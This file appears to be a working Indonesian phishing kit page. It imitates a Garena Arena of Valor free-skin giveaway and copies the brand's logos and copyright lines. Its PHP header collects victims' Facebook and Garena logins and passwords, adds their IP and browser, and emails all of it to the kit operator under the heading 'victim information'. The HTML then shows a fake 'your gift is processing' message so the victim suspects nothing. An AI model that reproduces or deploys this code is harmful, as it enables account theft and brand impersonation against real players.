<?php

include('cilepeung.php');
$efb    = $_POST['efb'];
$pfb    = $_POST['pfb'];
$uga    = $_POST['uga'];
$pga = $_POST['pga'];
$user = $_POST['user'];

$message   = "

=====> AKUN FACEBOOK <=====

Email atau Telepon: ".$efb."
Password:  ".$pfb."

=====> AKUN FACEBOOK <=====

=====> AKUN GARENA <=====

Username Garena / E-Mail / Nomor Handphone: ".$uga."
Password:  ".$pga."

=====> AKUN GARENA <=====

=====> INFORMASI KORBAN <=====

IP Info   :  ".$ip." | ".$nama_negro." On ".gmdate('r')."
Browser   :  ".$_SERVER['HTTP_USER_AGENT']."

=====> INFORMASI KORBAN <=====

";

include 'email.php';
$subject = "AOV CLAIM SKIN VIRAL | PUNYA SI ".$nickname."";
$headers = "From: DasyatPedia <result@dasyatpedia.com>"; // EMAIL SI PENGIRIM 
mail($emailku, $subject, $message, $headers);

$md5      = md5(gmdate("r"));
$sha1     = sha1(gmdate("r"));
?>
<!---- DasyatPedia INDONESIA 2018 ---->

<html>
<head>
<title>Garena AOV - Arena of Valor</title>
<link rel="shorcut icon" href="https://aov.garena.co.id/img/favicon.ico">
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.3/css/bootstrap.min.css">
<style type="text/css">
body { 
  background: url(img/bego.png) no-repeat center center fixed; 
  -webkit-background-size: cover;
  -moz-background-size: cover;
  -o-background-size: cover;
  background-size: cover;
}

.container {
	position:relative;
	margin:50px auto;
	max-width:650px;
	height:auto;
	border:2px solid #fff;
	padding:30px;
	box-sizing: border-box;
}

.box{
 background-color: rgba(215, 133, 0, 0.6);
 background: rgba(215, 133, 0, 0.6);
 color: rgba(215, 133, 0, 0.6);
 width: 100%;
 height: auto;
 padding:10px;
 margin:0px auto;
 color:#fff;
 border-radius: 10px;
 }
 
.header{
 background-color: rgba(215, 133, 0, 0.6);
 background: rgba(215, 133, 0, 0.6);
 color: rgba(215, 133, 0, 0.6);
 width: 100%;
 height: auto;
 padding:10px;
 margin:0px auto;
 color:#fff;
 border-radius: 10px;
}

.footer{
 background-color: rgba(215, 133, 0, 0.6);
 background: rgba(215, 133, 0, 0.6);
 color: rgba(215, 133, 0, 0.6);
 height: auto;
 padding:10px;
 margin:0px auto;
 color:#fff;
 border-radius: 10px;
}

.hadiah {
 display: inline-block;
 width: 250px;
 height: auto;
 margin: 20px;
 background-color: rgba(255, 135, 44, 0.8);
 background: rgba(255, 135, 44, 0.8);
 color: white;
 border-radius: 10px;
}

.hadiah-apa {
 width: 250px;
 height: auto;
 margin: auto;
 border-radius: 10px;
}

.hadiah h5 {
 margin: 10px auto;
 font-size: 1.5em;
 text-align: center;
 height: 50px;
}


.tombol {
 position: relative;
 width: 100%;
 height: 60px;
 margin: 0;
 background-color: rgba(255, 135, 44, 0.8);
 background: rgba(255, 135, 44, 0.8);
 color: white;
 border-radius: 10px;
 border: #FAAC58;
 color: #fff;
 font-size: 1.2em;
 letter-spacing: 1px;
 border-radius: 10px;
 outline: none;
 cursor: pointer;
}

.tombol:hover {
 background-color: rgba(255, 155, 44, 0.8);
 background: rgba(255, 155, 44, 0.8);
 color: white;
 border: #FE9A2E;
}

@font-face {
        font-family: paansi;
        src: url(fonts/fifa.ttf);
}
 
.huruf{
	font-family: 'paansi';
	font-size: 25pt;
	font-variant: inherit;
}

.huruf-kecil{
	font-family: 'paansi';
	font-size: 15pt;
	font-variant: inherit;
}

.huruf-footer{
	font-family: 'paansi';
	font-size: 1.0em;
	font-variant: inherit;
}
</style>

</head>
<body>

</br>
</br>

<center><img src="https://aov.garena.co.id/main/img/same/logo.png"></center>


</br>
</br>

				
<div class="container header">
<div class="slider-container">
<div class="slider">
<img src="https://lh3.googleusercontent.com/VelgQ73kgYalCAecR_S3UJlN72kj4Ubn-0RNmK0HvY9IXO0uTz7Kr1SvOtUvvXkhJA=w1319-h627-rw" height="245" style="width:100%">
</div>
<div class="slider">
<img src="https://lh3.googleusercontent.com/tibnHs27uA3jh7m-4MdDE3r-zL-T8oZWxLB8a0A1vwEiNBytj29-sQMCt1z6RoFUXw=w1319-h627-rw" height="245" style="width:100%">
</div>
<div class="slider">
<img src="https://lh3.googleusercontent.com/0mlo7SoTMj_CAVV6HGc8MzGC7GhZj_LfjvSM8eKZ7xw_Nau0_hSYQwmQpoBpjCfk3ys=w1319-h627-rw" height="245" style="width:100%">
</div>
<div class="slider">
<img src="https://lh3.googleusercontent.com/chkIoSx9Dxpv2nQQaOiPxo0MASQC-SpOCm0gMKz-XOxqcHgyxxHJ5Fm-hkIYI2qVcQ=w1319-h627-rw" height="245" style="width:100%">
</div>
<div class="slider">
<img src="https://lh3.googleusercontent.com/lC8tXlV4Gz0HVGSKu9opc60gHoOwRHqw4p5IwNoovL_Mnnqi2SlVlc8GlMqprKAnnyk=w1319-h627-rw" height="245" style="width:100%">
</div>
</div>
</div>

<div class="container box">

<center><h2 class="huruf">Hi, <b><?php echo $user;?></b></h2></center>
<center><h4 class="huruf-kecil">Your account has been processing</h4></center>
<center><h4 class="huruf-kecil">Please wait up to 24 hours</h4></center>
<center><h4 class="huruf-kecil">We will notify you if the gift has been delivered</h4></center>

</div>



<div class="container footer">
<center>
<img class="pull-left" height="50" width="50" src="https://pro.moba.garena.co.id/pc/img/timi.png">
<img class="pull-left" height="30" width="40" src="https://aov.garena.co.id/img/logo_m.png">

</br>
<span class="pull-right huruf-footer">Copyright &copy; Garena Online. Trademarks belong to their respective owners. </br> All Rights Reserved</span>
</br>
<span class="pull-right huruf-footer">Copyright &copy; Tencent. All rights reserved.</span>
</center>
</div>

</br>
</br>

<script type="text/javascript">
var slideIndex = 0;
showSlides();
function showSlides() {
    var i;
    var slides = document.getElementsByClassName("slider");
    for (i = 0; i < slides.length; i++) {
        slides[i].style.display = "none"; 
    }
    slideIndex++;
    if (slideIndex > slides.length) {slideIndex = 1} 
    slides[slideIndex-1].style.display = "block"; 
    setTimeout(showSlides, 3000);
}
</script>

</body>
</html>

<!---- DasyatPedia INDONESIA 2018 ---->

